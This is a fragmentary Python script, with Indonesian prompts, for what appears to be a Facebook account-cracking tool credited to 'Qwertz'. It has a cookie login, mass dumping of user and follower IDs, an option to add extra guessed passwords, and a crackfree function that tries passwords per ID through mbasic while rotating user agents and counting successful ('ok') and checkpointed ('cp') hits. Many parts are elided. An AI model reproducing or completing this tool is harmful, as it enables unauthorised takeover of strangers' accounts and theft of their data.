...
try:
	...
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mQwertz')
...
\t|_______/[___]   \'-;__/[_____][_____]'.__.'[___]    	
			{m}•{k}•{h}•{sir} Author : Qwertz {x}{m}•{k}•{h}•{x}''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def login_lagi334():
	try:
		...
		opo = random.choice([m,k,h,b,u])
		cookie=input(f'  [{h}•{x}] Masukkan Cookies :{opo} ')
...
def menu(my_name,my_id):
	...
	cetak(nel('\tSelamat Datang [green]%s[white] Syg'%(my_name)))
	Qwertz(f'>> Your Idz : '+str(my_id))
	Qwertz(f'>> Your Ip  : {ip}')
	print('')
	...
	print('>> 5. Hasil Crack  ')
	print('>> 0. Keluar       ')
	_____anjar_____ = input('\n>> Pilih : ')
	if _____anjar_____ in ['1']:
		dump_massal()
	elif _____anjar_____ in ['2']:
		dump_follower()
	elif _____anjar_____ in ['3']:
		error()
	elif _____anjar_____ in ['4']:
		crack_file()
	elif _____anjar_____ in ['5']:
		result()
	elif _____anjar_____ in ['0']:
...
def dump_massal():
	...
	try:
		...
		print('>> Masukan Angka, Malah Huruf ')
		exit()
	if jum<1 or jum>100:
...
#		taplikasi.append('no')
	...
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] kakak,yahahayuk,adik[white] '))
...
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r🔥 {P}[{opo}Mbasic{P}]{P}[{b}{loop}{P}/{p}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{m}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
